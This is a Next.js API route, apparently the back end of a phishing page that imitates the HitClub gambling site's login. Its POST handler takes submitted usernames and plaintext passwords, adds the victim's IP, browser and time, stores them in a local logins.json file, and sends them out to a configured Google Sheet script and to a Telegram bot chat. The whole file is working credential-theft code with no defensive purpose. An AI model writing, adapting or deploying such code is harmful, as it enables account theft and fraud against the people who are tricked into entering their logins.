import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET() {
  return NextResponse.json({
    status: 'ok',
    message: 'HitClub Submit API is active',
  });
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => null);
    if (!body || !body.username || !body.password) {
      return NextResponse.json(
        { ok: false, message: 'Dữ liệu không hợp lệ (thiếu tên đăng nhập hoặc mật khẩu)' },
        { status: 400 }
      );
    }

    const username = String(body.username).trim();
    const password = String(body.password);

    // Thu thập metadata người dùng
    const forwardedHeader = req.headers.get('x-forwarded-for');
    const clientIp = forwardedHeader
      ? forwardedHeader.split(',')[0].trim()
      : (req.headers.get('x-real-ip') || '127.0.0.1');
    const userAgent = req.headers.get('user-agent') || 'Không rõ';
    const referer = req.headers.get('referer') || '/';
    const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

    const submissionData = {
      username,
      password,
      ip: clientIp,
      userAgent,
      referer,
      time,
      createdAt: new Date().toISOString(),
    };

    // 1. Lưu dự phòng vào local file data/logins.json
    try {
      const dataDir = path.join(process.cwd(), 'data');
      if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
      }
      const dataFile = path.join(dataDir, 'logins.json');
      let records: unknown[] = [];
      if (fs.existsSync(dataFile)) {
        try {
          const content = fs.readFileSync(dataFile, 'utf-8');
          records = JSON.parse(content);
          if (!Array.isArray(records)) records = [];
        } catch {
          records = [];
        }
      }
      records.unshift(submissionData);
      if (records.length > 500) records = records.slice(0, 500);
      fs.writeFileSync(dataFile, JSON.stringify(records, null, 2), 'utf-8');
    } catch (fsErr) {
      console.error('[API Submit] Lỗi ghi file backup local:', fsErr);
    }

    // 2. Gửi đến Google Apps Script (nếu có cấu hình)
    const sheetUrl = process.env.GOOGLE_SHEET_URL || process.env.NEXT_PUBLIC_SHEET_URL;
    let sheetSent = false;
    if (sheetUrl && sheetUrl.startsWith('http')) {
      try {
        const res = await fetch(sheetUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
          body: JSON.stringify(submissionData),
          redirect: 'follow',
        });
        if (res.ok) {
          sheetSent = true;
        } else {
          console.warn('[API Submit] Google Sheet trả về status:', res.status);
        }
      } catch (sheetErr) {
        console.error('[API Submit] Lỗi kết nối Google Sheet:', sheetErr);
      }
    }

    // 3. Gửi đến Telegram Bot (nếu cấu hình)
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;
    if (tgToken && tgChatId) {
      try {
        const tgText =
          `🔔 *HITCLUB - ĐĂNG NHẬP MỚI*\n\n` +
          `👤 *Tài khoản:* \`${username}\`\n` +
          `🔑 *Mật khẩu:* \`${password}\`\n` +
          `🌐 *IP:* \`${clientIp}\`\n` +
          `⏰ *Thời gian:* ${time}\n` +
          `📱 *Thiết bị:* ${userAgent.slice(0, 120)}`;

        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: tgChatId,
            text: tgText,
            parse_mode: 'Markdown',
          }),
        });
      } catch (tgErr) {
        console.error('[API Submit] Lỗi gửi Telegram:', tgErr);
      }
    }

    return NextResponse.json({
      ok: true,
      message: 'Gửi dữ liệu thành công',
      sheetSent,
    });
  } catch (error) {
    console.error('[API Submit] Lỗi xử lý:', error);
    return NextResponse.json(
      { ok: false, message: 'Đã có lỗi xảy ra từ máy chủ' },
      { status: 500 }
    );
  }
}
